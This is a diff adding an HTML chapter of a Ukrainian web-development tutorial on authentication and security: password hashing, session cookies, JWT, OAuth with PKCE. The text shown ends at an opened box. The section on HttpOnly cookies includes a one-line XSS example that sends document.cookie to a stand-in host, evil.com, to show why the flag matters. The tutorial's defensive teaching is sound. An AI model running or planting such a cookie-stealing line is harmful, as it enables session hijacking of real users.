@@ -1,0 +1,851 @@
+<!doctype html>
+<html lang="uk">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>07. Автентифікація та безпека — Fullstack для чайників</title>
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+<div class="layout">
+<nav id="sidebar" aria-label="Зміст"></nav>
+<main>
+
+<header class="chapter-head">
+  <div class="kicker">Розділ 07 · <span class="level-badge level-2">Середній</span></div>
+  <h1>Автентифікація та безпека</h1>
+  <p class="lead">Після цього розділу ви зрозумієте, як сервер дізнається «хто ти» і «що тобі можна», чому пароль ніколи не зберігають у відкритому вигляді, чим сесії відрізняються від JWT, як працює «Увійти через Google» і від яких атак треба захищатися в першу чергу.</p>
+  <div class="meta"><span>⏱ ~90 хв</span><span>📚 Передумови: розділи 04, 05</span><span>🎯 Ціль: написати безпечний логін двома способами</span></div>
+</header>
+
+<div class="toc">
+  <div class="title">У цьому розділі</div>
+  <ol>
+    <li><a href="#s1">Автентифікація vs авторизація</a></li>
+    <li><a href="#s2">Паролі: хешування, сіль, bcrypt і argon2</a></li>
+    <li><a href="#s3">Сесії та cookie</a></li>
+    <li><a href="#s4">JWT: структура, access і refresh токени</a></li>
+    <li><a href="#s5">Сесії проти JWT: порівняння</a></li>
+    <li><a href="#s6">OAuth 2.0 та OpenID Connect: «Увійти через Google»</a></li>
+    <li><a href="#s7">Ролі та права: RBAC і ABAC</a></li>
+    <li><a href="#s8">OWASP Top 10: найпоширеніші атаки</a></li>
+    <li><a href="#s9">Периметр: rate limiting, HTTPS, helmet, CORS, секрети</a></li>
+    <li><a href="#s10">2FA, TOTP і passkeys</a></li>
+    <li><a href="#s11">Практика: логін на Express — сесії та JWT</a></li>
+  </ol>
+</div>
+
+<div class="box kid">
+  <div class="title">Пояснення для п'ятирічного</div>
+  <p>Уяви великий офісний будинок. На вході стоїть охоронець і просить показати паспорт — це <b>автентифікація</b>: він перевіряє, що ти справді той, за кого себе видаєш. Потім тобі дають перепустку, на якій написано, у які кімнати ти можеш заходити — це <b>авторизація</b>. Паспорт охоронець не забирає і не копіює: він лише запам'ятовує «так, я його бачив» — так само сервер не зберігає твій пароль, а тільки його «відбиток». Перепустку можна зробити двох видів: пластикову картку з номером, який охоронець звіряє зі своїм списком (сесія), або запечатаний конверт із печаткою директора, який кожен може перевірити сам, не дзвонячи охоронцю (JWT). А ще у будинку є шахраї: хтось намагається підглянути твою перепустку, хтось підсовує тобі підроблені папери на підпис, хтось відкриває чужі кабінети, перебираючи номери на дверях. Про всіх них — у цьому розділі.</p>
+</div>
+
+<h2 id="s1">1. Автентифікація vs авторизація</h2>
+<p>Ці два слова плутають навіть досвідчені розробники, тому запам'ятаймо їх раз і назавжди:</p>
+<ul>
+  <li><b>Автентифікація (authentication, AuthN)</b> — відповідь на питання «<i>хто ти?</i>». Користувач доводить свою особу: паролем, кодом з SMS, відбитком пальця, входом через Google.</li>
+  <li><b>Авторизація (authorization, AuthZ)</b> — відповідь на питання «<i>що тобі можна?</i>». Система вирішує, чи має цей уже впізнаний користувач право видалити пост, побачити чужий профіль, змінити налаштування.</li>
+</ul>
+<p>Порядок завжди один: спочатку автентифікація, потім авторизація. Не можна вирішити, чи можна людині в серверну, якщо ти не знаєш, хто вона. У HTTP це відбито в кодах відповіді: <code>401 Unauthorized</code> насправді означає «не автентифікований — я не знаю, хто ти» (історична плутанина в назві), а <code>403 Forbidden</code> — «я знаю, хто ти, але тобі сюди не можна».</p>
+
+<figure>
+  <svg viewBox="0 0 760 240" role="img" aria-label="Потік запиту через автентифікацію і авторизацію">
+    <defs><marker id="arr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z"/></marker></defs>
+    <rect x="10" y="80" width="140" height="80" rx="14" class="blue"/>
+    <text x="80" y="115" text-anchor="middle" class="bold">Запит</text>
+    <text x="80" y="138" text-anchor="middle" class="muted">DELETE /posts/7</text>
+    <path d="M150 120 L215 120" class="arrow"/>
+    <rect x="215" y="60" width="170" height="120" rx="14" class="accent"/>
+    <text x="300" y="95" text-anchor="middle" class="bold">Автентифікація</text>
+    <text x="300" y="118" text-anchor="middle" class="small">«Хто ти?»</text>
+    <text x="300" y="140" text-anchor="middle" class="mono">cookie / token</text>
+    <text x="300" y="162" text-anchor="middle" class="muted">ні → 401</text>
+    <path d="M385 120 L450 120" class="arrow"/>
+    <rect x="450" y="60" width="170" height="120" rx="14" class="purple"/>
+    <text x="535" y="95" text-anchor="middle" class="bold">Авторизація</text>
+    <text x="535" y="118" text-anchor="middle" class="small">«Чи можна тобі?»</text>
+    <text x="535" y="140" text-anchor="middle" class="mono">owner? admin?</text>
+    <text x="535" y="162" text-anchor="middle" class="muted">ні → 403</text>
+    <path d="M620 120 L690 120" class="arrow"/>
+    <rect x="690" y="90" width="60" height="60" rx="14" class="green"/>
+    <text x="720" y="126" text-anchor="middle" class="bold">200</text>
+    <text x="380" y="220" text-anchor="middle" class="muted">Спочатку впізнаємо, потім перевіряємо права — ніколи навпаки</text>
+  </svg>
+  <figcaption>Кожен захищений запит проходить два фільтри: спершу «хто», потім «що можна».</figcaption>
+</figure>
+
+<div class="box why">
+  <div class="title">Чому це важливо</div>
+  <p>Більшість реальних дірок у безпеці — не «зламані шифри», а забута перевірка авторизації: розробник перевірив, що користувач залогінений, і забув перевірити, що пост, який він видаляє, належить саме йому. У списку OWASP Top 10 ця категорія («Broken Access Control») тримає перше місце вже кілька років поспіль.</p>
+</div>
+
+<h2 id="s2">2. Паролі: хешування, сіль, bcrypt і argon2</h2>
+<p>Перше правило: <b>сервер ніколи не зберігає пароль</b>. Ні у базі, ні в логах, ні «тимчасово». Бази даних витікають регулярно — і якщо у вашій таблиці лежать паролі відкритим текстом, зловмисник отримує не тільки доступ до вашого сайту, а й до пошти, банку і соцмереж усіх ваших користувачів (бо люди повторюють паролі).</p>
+<p>Що ж зберігати? <b>Хеш (hash)</b> — результат односторонньої функції. З пароля легко отримати хеш, а з хеша неможливо відновити пароль. При логіні ми хешуємо введений пароль і порівнюємо два хеші.</p>
+<p>Важливо розрізняти:</p>
+<ul>
+  <li><b>Шифрування (encryption)</b> — двостороннє. Є ключ, яким можна розшифрувати назад. Якщо ключ витече разом із базою — все пропало. Паролі шифрувати <i>не треба</i>.</li>
+  <li><b>Хешування (hashing)</b> — одностороннє. Розшифрувати не можна принципово. Це те, що потрібно для паролів.</li>
+</ul>
+<p>Але й хешувати треба правильно. Звичайні швидкі хеші (MD5, SHA-256) для паролів не годяться з двох причин:</p>
+<ol>
+  <li><b>Райдужні таблиці (rainbow tables)</b>. Зловмисник заздалегідь обчислює хеші мільярдів популярних паролів і просто шукає збіг. Ліки — <b>сіль (salt)</b>: випадковий рядок, який додається до кожного пароля перед хешуванням. Два користувачі з паролем <code>123456</code> отримають різні хеші, і таблиця стає марною.</li>
+  <li><b>Швидкість</b>. SHA-256 обчислюється мільярди разів на секунду на звичайній відеокарті. Пароль з 8 символів перебирається за години. Ліки — <b>повільні функції</b> з налаштовуваною «вартістю»: bcrypt, scrypt, argon2. Вони навмисно з'їдають десятки мілісекунд на один хеш — для користувача непомітно, для перебору мільярдів варіантів — катастрофа.</li>
+</ol>
+
+<figure>
+  <svg viewBox="0 0 760 300" role="img" aria-label="Схема хешування пароля з сіллю через bcrypt">
+    <defs><marker id="arr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z"/></marker></defs>
+    <text x="20" y="30" class="bold">Реєстрація</text>
+    <rect x="20" y="45" width="130" height="50" rx="12" class="blue"/>
+    <text x="85" y="76" text-anchor="middle" class="mono">"kotyk2024"</text>
+    <rect x="20" y="110" width="130" height="50" rx="12" class="accent"/>
+    <text x="85" y="133" text-anchor="middle" class="small">сіль (random)</text>
+    <text x="85" y="150" text-anchor="middle" class="mono">$2b$12$N9qo8u...</text>
+    <path d="M150 70 L230 100" class="arrow"/>
+    <path d="M150 135 L230 110" class="arrow"/>
+    <rect x="230" y="70" width="150" height="70" rx="14" class="purple"/>
+    <text x="305" y="98" text-anchor="middle" class="bold">bcrypt</text>
+    <text x="305" y="120" text-anchor="middle" class="small">cost=12 (~250 мс)</text>
+    <path d="M380 105 L460 105" class="arrow"/>
+    <rect x="460" y="60" width="280" height="90" rx="14" class="green"/>
+    <text x="600" y="88" text-anchor="middle" class="bold">Що лежить у базі</text>
+    <text x="600" y="110" text-anchor="middle" class="mono">$2b$12$N9qo8uLOickgx2ZMRZoMye</text>
+    <text x="600" y="128" text-anchor="middle" class="mono">IjZAgcfl7p92ldGxad68LJZdL17lhWy</text>
+    <text x="600" y="145" text-anchor="middle" class="muted">алгоритм · вартість · сіль · хеш — усе в одному рядку</text>
+
+    <text x="20" y="200" class="bold">Логін</text>
+    <rect x="20" y="215" width="130" height="50" rx="12" class="blue"/>
+    <text x="85" y="246" text-anchor="middle" class="mono">"kotyk2024"</text>
+    <path d="M150 240 L230 240" class="arrow"/>
+    <rect x="230" y="205" width="150" height="70" rx="14" class="purple"/>
+    <text x="305" y="233" text-anchor="middle" class="bold">bcrypt.compare</text>
+    <text x="305" y="255" text-anchor="middle" class="small">бере сіль із хеша</text>
+    <path d="M380 240 L460 240" class="arrow"/>
+    <rect x="460" y="215" width="130" height="50" rx="12" class="green"/>
+    <text x="525" y="246" text-anchor="middle" class="bold">true / false</text>
+    <path d="M600 150 L600 200" class="arrow dashed"/>
+    <text x="640" y="185" class="muted">хеш із бази</text>
+  </svg>
+  <figcaption>bcrypt сам генерує сіль і вбудовує її в результат, тому при логіні окремо зберігати сіль не треба.</figcaption>
+</figure>
+
+<pre><code class="language-js">// password.js — Node 20+, ES modules
+import bcrypt from "bcrypt";
+// або: import argon2 from "argon2";  — сучасніший вибір (переможець Password Hashing Competition)
+
+const COST = 12; // «вартість»: кожен +1 подвоює час. Підбирайте так, щоб хеш займав ~250 мс
+
+export async function hashPassword(plain) {
+  // bcrypt.hash сам згенерує випадкову сіль і вшиє її в рядок результату
+  return bcrypt.hash(plain, COST);
+}
+
+export async function verifyPassword(plain, storedHash) {
+  // compare витягне сіль зі storedHash, захешує plain і порівняє за сталий час
+  return bcrypt.compare(plain, storedHash);
+}
+
+// Варіант із argon2id (рекомендація OWASP на 2024+):
+// const hash = await argon2.hash(plain, { type: argon2.argon2id, memoryCost: 19456, timeCost: 2 });
+// const ok = await argon2.verify(hash, plain);</code></pre>
+
+<div class="box warn">
+  <div class="title">Підводні камені</div>
+  <ul>
+    <li>bcrypt обрізає пароль на 72 байтах. Довші паролі (парольні фрази) мовчки «вкорочуються». argon2 такого обмеження не має.</li>
+    <li>Не порівнюйте хеші через <code>===</code> вручну — це вразливо до timing-атак. Використовуйте <code>bcrypt.compare</code> або <code>crypto.timingSafeEqual</code>.</li>
+    <li>Не вигадуйте власний алгоритм «SHA-256 тисячу разів у циклі». Криптографію не пишуть самі — її беруть із перевірених бібліотек.</li>
+    <li>Не обмежуйте пароль зверху 16 символами і не забороняйте спецсимволи — це ознака, що ви зберігаєте його неправильно.</li>
+  </ul>
+</div>
+
+<h2 id="s3">3. Сесії та cookie</h2>
+<p>HTTP — протокол без стану (stateless): кожен запит для сервера — як перша зустріч. Щоб сервер «пам'ятав» вас між запитами, потрібен механізм. Класичний — <b>сесія (session)</b> + <b>cookie</b>.</p>
+<ol>
+  <li>Користувач надсилає логін і пароль.</li>
+  <li>Сервер перевіряє пароль, створює запис у сховищі сесій (пам'ять, Redis, таблиця в БД): <code>{ sessionId: "a8f3...", userId: 42, createdAt, expiresAt }</code>.</li>
+  <li>Сервер відповідає із заголовком <code>Set-Cookie: sid=a8f3...; HttpOnly; Secure; SameSite=Lax</code>.</li>
+  <li>Браузер зберігає cookie і <i>автоматично</i> додає її до кожного наступного запиту на цей домен.</li>
+  <li>Сервер читає <code>sid</code>, шукає його у сховищі, знаходить <code>userId</code> — тепер він знає, хто ви.</li>
+</ol>
+
+<figure>
+  <svg viewBox="0 0 760 360" role="img" aria-label="Послідовність логіну через сесію і cookie">
+    <defs><marker id="arr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z"/></marker></defs>
+    <rect x="20" y="20" width="140" height="44" rx="12" class="blue"/><text x="90" y="48" text-anchor="middle" class="bold">Браузер</text>
+    <rect x="310" y="20" width="140" height="44" rx="12" class="green"/><text x="380" y="48" text-anchor="middle" class="bold">Сервер</text>
+    <rect x="600" y="20" width="140" height="44" rx="12" class="purple"/><text x="670" y="48" text-anchor="middle" class="bold">Сховище сесій</text>
+    <path d="M90 64 L90 340" class="arrow dashed" style="marker-end:none"/>
+    <path d="M380 64 L380 340" class="arrow dashed" style="marker-end:none"/>
+    <path d="M670 64 L670 340" class="arrow dashed" style="marker-end:none"/>
+
+    <path d="M90 100 L378 100" class="arrow"/>
+    <text x="234" y="92" text-anchor="middle" class="mono">POST /login {email, password}</text>
+
+    <text x="395" y="128" class="small">bcrypt.compare → ок</text>
+    <path d="M380 150 L668 150" class="arrow"/>
+    <text x="524" y="142" text-anchor="middle" class="mono">SET sid=a8f3 → {userId:42}</text>
+
+    <path d="M378 200 L92 200" class="arrow"/>
+    <text x="234" y="192" text-anchor="middle" class="mono">200 + Set-Cookie: sid=a8f3; HttpOnly</text>
+
+    <path d="M90 250 L378 250" class="arrow"/>
+    <text x="234" y="242" text-anchor="middle" class="mono">GET /me  Cookie: sid=a8f3</text>
+    <path d="M380 280 L668 280" class="arrow"/>
+    <text x="524" y="272" text-anchor="middle" class="mono">GET sid=a8f3 → userId 42</text>
+    <path d="M378 320 L92 320" class="arrow"/>
+    <text x="234" y="312" text-anchor="middle" class="mono">200 {id:42, name:"Оля"}</text>
+  </svg>
+  <figcaption>Cookie містить лише випадковий ідентифікатор. Усі дані про користувача — на сервері.</figcaption>
+</figure>
+
+<p>Ключова ідея: у cookie лежить <i>випадковий</i>, довгий (≥128 біт), непередбачуваний ідентифікатор. Він нічого не означає сам по собі — це просто ключ до запису на сервері. Тому сесію легко <b>відкликати</b>: видалили запис — користувач розлогінений миттєво на всіх пристроях.</p>
+
+<h3>Атрибути cookie, які треба знати напам'ять</h3>
+<div class="table-wrap">
+<table>
+  <tr><th>Атрибут</th><th>Що робить</th><th>Навіщо</th></tr>
+  <tr><td><code>HttpOnly</code></td><td>Cookie недоступна з JavaScript (<code>document.cookie</code> її не бачить)</td><td>Захист від крадіжки через XSS</td></tr>
+  <tr><td><code>Secure</code></td><td>Надсилається тільки по HTTPS</td><td>Не перехопиться в кафе по Wi-Fi</td></tr>
+  <tr><td><code>SameSite=Lax</code></td><td>Не надсилається з чужих сайтів при POST/fetch, але надсилається при звичайному переході за посиланням</td><td>Базовий захист від CSRF, розумний дефолт</td></tr>
+  <tr><td><code>SameSite=Strict</code></td><td>Ніколи не надсилається з чужого сайту, навіть при кліку на посилання</td><td>Максимальний захист, але користувач, що прийшов за посиланням, буде «незалогіненим»</td></tr>
+  <tr><td><code>SameSite=None</code></td><td>Надсилається завжди (потребує <code>Secure</code>)</td><td>Для віджетів/iframe на чужих сайтах</td></tr>
+  <tr><td><code>Max-Age</code> / <code>Expires</code></td><td>Час життя</td><td>Без них cookie живе до закриття браузера</td></tr>
+  <tr><td><code>Path</code>, <code>Domain</code></td><td>Обмежують, куди надсилати</td><td>Не віддавайте cookie всім піддоменам без потреби</td></tr>
+</table>
+</div>
+
+<div class="box why">
+<div class="title">Чому HttpOnly — не опція, а обов'язок</div>
+<p>Якщо на вашому сайті є хоч одна XSS-дірка (а вона рано чи пізно буде), скрипт зловмисника виконає <code>fetch("https://evil.com/?c=" + document.cookie)</code> і забере сесію кожного відвідувача. З <code>HttpOnly</code> цей код побачить порожній рядок. Це один прапорець, який закриває цілий клас атак.</p>
+</div>
+
+<h2 id="s4">4. JWT: структура, access і refresh токени</h2>
+<p><b>JWT (JSON Web Token)</b> — інший підхід: замість ключа до запису на сервері ми даємо клієнту <i>сам запис</i>, підписаний так, що змінити його непомітно неможливо. Це «запечатаний конверт з печаткою директора»: будь-хто може відкрити і прочитати, але підробити печатку — ні.</p>
+<p>Токен складається з трьох частин у base64url, розділених крапками: <code>header.payload.signature</code>.</p>
+
+<figure>
+  <svg viewBox="0 0 760 300" role="img" aria-label="Структура JWT: header, payload, signature">
+    <defs><marker id="arr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z"/></marker></defs>
+    <text x="380" y="30" text-anchor="middle" class="mono">eyJhbGciOiJIUzI1NiJ9 . eyJzdWIiOiI0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzI1ODg4MDAwfQ . SflKxwRJSMeKKF2QT4fwpM...</text>
+    <path d="M150 40 L150 70" class="arrow"/>
+    <path d="M380 40 L380 70" class="arrow"/>
+    <path d="M620 40 L620 70" class="arrow"/>
+    <rect x="30" y="70" width="230" height="130" rx="14" class="blue"/>
+    <text x="145" y="95" text-anchor="middle" class="bold">Header</text>
+    <text x="145" y="120" text-anchor="middle" class="mono">{ "alg": "HS256",</text>
+    <text x="145" y="140" text-anchor="middle" class="mono">  "typ": "JWT" }</text>
+    <text x="145" y="175" text-anchor="middle" class="muted">яким алгоритмом підписано</text>
+    <rect x="270" y="70" width="230" height="130" rx="14" class="accent"/>
+    <text x="385" y="95" text-anchor="middle" class="bold">Payload (claims)</text>
+    <text x="385" y="118" text-anchor="middle" class="mono">{ "sub": "42",</text>
+    <text x="385" y="136" text-anchor="middle" class="mono">  "role": "user",</text>
+    <text x="385" y="154" text-anchor="middle" class="mono">  "exp": 1725888000 }</text>
+    <text x="385" y="185" text-anchor="middle" class="muted">НЕ зашифровано — лише закодовано</text>
+    <rect x="510" y="70" width="230" height="130" rx="14" class="red"/>
+    <text x="625" y="95" text-anchor="middle" class="bold">Signature</text>
+    <text x="625" y="120" text-anchor="middle" class="mono small">HMAC-SHA256(</text>
+    <text x="625" y="138" text-anchor="middle" class="mono small">  base64(header) + "." +</text>
+    <text x="625" y="156" text-anchor="middle" class="mono small">  base64(payload), SECRET)</text>
+    <text x="625" y="185" text-anchor="middle" class="muted">без SECRET не підробиш</text>
+    <rect x="30" y="225" width="710" height="55" rx="12" class="box-fill"/>
+    <text x="385" y="248" text-anchor="middle" class="small">Сервер перевіряє: підпис збігається? термін (exp) не минув? → довіряє payload без звернення до бази</text>
+    <text x="385" y="268" text-anchor="middle" class="muted">Змінили "role":"admin" у payload → підпис уже не збігається → токен відхилено</text>
+  </svg>
+  <figcaption>JWT — це підписані, але не зашифровані дані. Ніколи не кладіть у payload паролі чи секрети.</figcaption>
+</figure>
+
+<p>Перевага: сервер перевіряє токен <i>без бази даних</i> — лише математика. Це чудово масштабується: десять серверів за балансувальником можуть перевіряти токени незалежно, знаючи лише спільний секрет (або публічний ключ, якщо алгоритм RS256/ES256).</p>
+<p>Недолік — зворотний бік тієї ж медалі: <b>токен не можна відкликати</b>. Якщо він дійсний 24 години, то й після «виходу» він працюватиме 24 години. Тому JWT майже завжди використовують у парі:</p>
+<ul>
+  <li><b>Access token</b> — короткоживучий (5–15 хвилин). Надсилається з кожним запитом до API в заголовку <code>Authorization: Bearer &lt;token&gt;</code>.</li>
+  <li><b>Refresh token</b> — довгоживучий (дні–тижні). Зберігається у базі (тобто його <i>можна</i> відкликати), використовується <i>лише</i> для отримання нового access token.</li>
+</ul>
+
+<figure>
+  <svg viewBox="0 0 760 380" role="img" aria-label="Потік access і refresh токенів">
+    <defs><marker id="arr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z"/></marker></defs>
+    <rect x="20" y="20" width="140" height="44" rx="12" class="blue"/><text x="90" y="48" text-anchor="middle" class="bold">Клієнт (SPA)</text>
+    <rect x="310" y="20" width="140" height="44" rx="12" class="green"/><text x="380" y="48" text-anchor="middle" class="bold">Auth-сервер</text>
+    <rect x="600" y="20" width="140" height="44" rx="12" class="purple"/><text x="670" y="48" text-anchor="middle" class="bold">API-сервер</text>
+    <path d="M90 64 L90 360" class="arrow dashed" style="marker-end:none"/>
+    <path d="M380 64 L380 360" class="arrow dashed" style="marker-end:none"/>
+    <path d="M670 64 L670 360" class="arrow dashed" style="marker-end:none"/>
+
+    <path d="M90 95 L378 95" class="arrow"/>
+    <text x="234" y="87" text-anchor="middle" class="mono">POST /login</text>
+    <path d="M378 130 L92 130" class="arrow"/>
+    <text x="234" y="122" text-anchor="middle" class="mono">access (15 хв) + refresh (7 дн, HttpOnly cookie)</text>
+
+    <path d="M90 175 L668 175" class="arrow"/>
+    <text x="380" y="167" text-anchor="middle" class="mono">GET /notes  Authorization: Bearer access</text>
+    <text x="690" y="200" class="small">перевірив підпис</text>
+    <text x="690" y="216" class="small">без БД → 200</text>
+
+    <path d="M90 250 L668 250" class="arrow"/>
+    <text x="380" y="242" text-anchor="middle" class="mono">GET /notes  (access протух)</text>
+    <path d="M668 275 L92 275" class="arrow"/>
+    <text x="380" y="267" text-anchor="middle" class="mono">401 token expired</text>
+
+    <path d="M90 310 L378 310" class="arrow"/>
+    <text x="234" y="302" text-anchor="middle" class="mono">POST /refresh  Cookie: refresh</text>
+    <text x="395" y="330" class="small">refresh є в БД і не відкликаний?</text>
+    <path d="M378 350 L92 350" class="arrow"/>
+    <text x="234" y="342" text-anchor="middle" class="mono">новий access (+ новий refresh)</text>
+  </svg>
+  <figcaption>Access живе хвилини, тому «вікно» після витоку мале. Refresh лежить у базі і може бути відкликаний.</figcaption>
+</figure>
+
+<h3>Де зберігати токени на клієнті</h3>
+<ul>
+  <li><b>localStorage</b> — зручно, але доступно будь-якому JS на сторінці, включно зі шкідливим. Один XSS — і токени вкрадено. Не рекомендується для refresh token.</li>
+  <li><b>HttpOnly cookie</b> — JS не бачить, тож XSS не вкраде. Але cookie надсилається автоматично, тож потрібен захист від CSRF (<code>SameSite</code> + перевірка <code>Origin</code>).</li>
+  <li><b>Пам'ять (змінна в JS)</b> — для access token це найбезпечніше: зникає при перезавантаженні сторінки, і тоді ми просто тихо отримуємо новий через refresh.</li>
+</ul>
+<p>Поширений компроміс: access token — у пам'яті, refresh token — у HttpOnly cookie з <code>Path=/auth/refresh</code>, щоб він не летів з кожним запитом.</p>
+
+<div class="box warn">
+  <div class="title">Класичні помилки з JWT</div>
+  <ul>
+    <li><b><code>alg: none</code></b>. Старі бібліотеки приймали токен без підпису, якщо в header було написано <code>"alg":"none"</code>. Завжди явно передавайте дозволені алгоритми у <code>verify</code>.</li>
+    <li><b>Плутанина ключів</b>. Токен, підписаний RS256 (приватним ключем), можна спробувати перевірити як HS256, використавши <i>публічний</i> ключ як «секрет». Знову ж: фіксуйте алгоритм.</li>
+    <li><b>Секрет у репозиторії</b>. Секрет для HS256 має бути довгим (≥256 біт) і жити в змінних середовища.</li>
+    <li><b>Персональні дані в payload</b>. Payload читається будь-ким, хто має токен. Email — ще припустимо, номер картки — ні.</li>
+    <li><b>Вічні токени</b>. Access без <code>exp</code> — це пароль, який ніколи не змінюється.</li>
+  </ul>
+</div>
+
+<h2 id="s5">5. Сесії проти JWT: порівняння</h2>
+<div class="table-wrap">
+<table>
+  <tr><th>Критерій</th><th>Сесії + cookie</th><th>JWT</th></tr>
+  <tr><td>Де стан</td><td>На сервері (Redis/БД)</td><td>У самому токені (stateless)</td></tr>
+  <tr><td>Відкликання</td><td>Миттєве — видалити запис</td><td>Складно; потрібен чорний список або короткий <code>exp</code> + refresh</td></tr>
+  <tr><td>Масштабування</td><td>Потрібне спільне сховище сесій</td><td>Будь-який сервер із ключем перевірить</td></tr>
+  <tr><td>Навантаження на БД</td><td>Один пошук на запит (Redis — мікросекунди)</td><td>Нуль — лише криптографія</td></tr>
+  <tr><td>Розмір</td><td>Cookie ~32 байти</td><td>Сотні байт–кілобайти на кожен запит</td></tr>
+  <tr><td>Мобільні клієнти / інші сервіси</td><td>Cookie незручні поза браузером</td><td>Природно: заголовок Bearer</td></tr>
+  <tr><td>Мікросервіси</td><td>Кожен сервіс має ходити у сховище сесій</td><td>Кожен сервіс перевіряє сам</td></tr>
+  <tr><td>Складність реалізації</td><td>Низька: <code>express-session</code> + Redis</td><td>Вища: два токени, ротація, зберігання</td></tr>
+  <tr><td>Коли обирати</td><td>Класичний веб-застосунок, один бекенд, SSR</td><td>Публічний API, мобільні застосунки, мікросервіси, сторонні клієнти</td></tr>
+</table>
+</div>
+<p>Чесна порада: для типового застосунку «сайт + свій бекенд» <b>сесії простіші і безпечніші</b>. JWT — коли у вас є реальна причина: чужі клієнти, багато сервісів, відсутність спільного сховища. Багато проєктів обирають JWT «бо модно» і потім винаходять сховище для refresh-токенів, тобто ті самі сесії, тільки складніше.</p>
+
+<h2 id="s6">6. OAuth 2.0 та OpenID Connect: «Увійти через Google»</h2>
+<p><b>OAuth 2.0</b> — це протокол <i>делегованого доступу</i>: «дозволь застосунку X зробити Y від мого імені в сервісі Z, не даючи йому мого пароля від Z». Наприклад, дозволити застосунку для планування читати ваш Google Calendar. <b>OpenID Connect (OIDC)</b> — надбудова над OAuth 2.0, яка додає «а ще скажи застосунку, хто я» через <code>id_token</code> (звичайний JWT із <code>sub</code>, <code>email</code>, <code>name</code>). Саме OIDC стоїть за кнопкою «Увійти через Google/GitHub/Apple».</p>
+<p>Учасники (терміни зі специфікації):</p>
+<ul>
+  <li><b>Resource Owner</b> — користувач, власник даних.</li>
+  <li><b>Client</b> — ваш застосунок.</li>
+  <li><b>Authorization Server</b> — Google, який питає користувача «дозволити?» і видає токени.</li>
+  <li><b>Resource Server</b> — API Google, що віддає дані за токеном.</li>
+</ul>
+<p>Найважливіший потік — <b>Authorization Code Flow з PKCE</b> (вимовляється «піксі», Proof Key for Code Exchange). Простими словами: застосунок відправляє користувача до Google з «запечатаним замком» (<code>code_challenge</code>), Google повертає одноразовий код, а обміняти код на токен можна тільки маючи «ключ» (<code>code_verifier</code>), який ніколи не покидав застосунок. Навіть якщо хтось перехопить код у редиректі — без verifier він марний.</p>
+
+<figure>
+  <svg viewBox="0 0 760 460" role="img" aria-label="OAuth 2.0 Authorization Code Flow з PKCE">
+    <defs><marker id="arr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z"/></marker></defs>
+    <rect x="10" y="20" width="130" height="44" rx="12" class="blue"/><text x="75" y="48" text-anchor="middle" class="bold">Браузер</text>
+    <rect x="240" y="20" width="150" height="44" rx="12" class="green"/><text x="315" y="48" text-anchor="middle" class="bold">Ваш бекенд</text>
+    <rect x="500" y="20" width="240" height="44" rx="12" class="purple"/><text x="620" y="48" text-anchor="middle" class="bold">Google (Auth Server)</text>
+    <path d="M75 64 L75 440" class="arrow dashed" style="marker-end:none"/>
+    <path d="M315 64 L315 440" class="arrow dashed" style="marker-end:none"/>
+    <path d="M620 64 L620 440" class="arrow dashed" style="marker-end:none"/>
+
+    <path d="M75 95 L313 95" class="arrow"/>
+    <text x="194" y="87" text-anchor="middle" class="mono">клік «Увійти через Google»</text>
+    <text x="330" y="118" class="small">verifier = random(64)</text>
+    <text x="330" y="134" class="small">challenge = sha256(verifier)</text>
+    <text x="330" y="150" class="small">state = random → у сесію</text>
+    <path d="M313 170 L77 170" class="arrow"/>
+    <text x="194" y="162" text-anchor="middle" class="mono">302 → accounts.google.com/authorize?</text>
+    <text x="194" y="186" text-anchor="middle" class="mono small">client_id, redirect_uri, scope=openid email, state, code_challenge</text>
+
+    <path d="M75 215 L618 215" class="arrow"/>
+    <text x="350" y="207" text-anchor="middle" class="mono">GET /authorize?...</text>
+    <text x="635" y="240" class="small">логін + «Дозволити?»</text>
+    <path d="M618 265 L77 265" class="arrow"/>
+    <text x="350" y="257" text-anchor="middle" class="mono">302 → yourapp.com/callback?code=XYZ&amp;state=...</text>
+
+    <path d="M75 300 L313 300" class="arrow"/>
+    <text x="194" y="292" text-anchor="middle" class="mono">GET /callback?code=XYZ&amp;state</text>
+    <text x="330" y="322" class="small">state збігається? (анти-CSRF)</text>
+    <path d="M315 345 L618 345" class="arrow"/>
+    <text x="466" y="337" text-anchor="middle" class="mono">POST /token {code, code_verifier, client_secret}</text>
+    <text x="635" y="368" class="small">sha256(verifier)==challenge?</text>
+    <path d="M618 390 L317 390" class="arrow"/>
+    <text x="466" y="382" text-anchor="middle" class="mono">{access_token, id_token(JWT), refresh_token}</text>
+    <text x="330" y="412" class="small">перевірити id_token → sub, email</text>
+    <path d="M313 430 L77 430" class="arrow"/>
+    <text x="194" y="422" text-anchor="middle" class="mono">Set-Cookie: sid=... (своя сесія)</text>
+  </svg>
+  <figcaption>Ваш бекенд ніколи не бачить пароль користувача від Google. Після успіху ви створюєте <i>свою</i> сесію — далі все як звичайно.</figcaption>
+</figure>
+
+<p>Про інші потоки: <b>Implicit Flow</b> (токен одразу у фрагменті URL) — застарілий і не рекомендований; <b>Client Credentials</b> — для «машина-машина» без користувача; <b>Device Flow</b> — для телевізорів і CLI («відкрийте на телефоні і введіть код»). Для веб- і мобільних застосунків відповідь одна: Authorization Code + PKCE.</p>
+
+<div class="box pro">
+  <div class="title">Для просунутих</div>
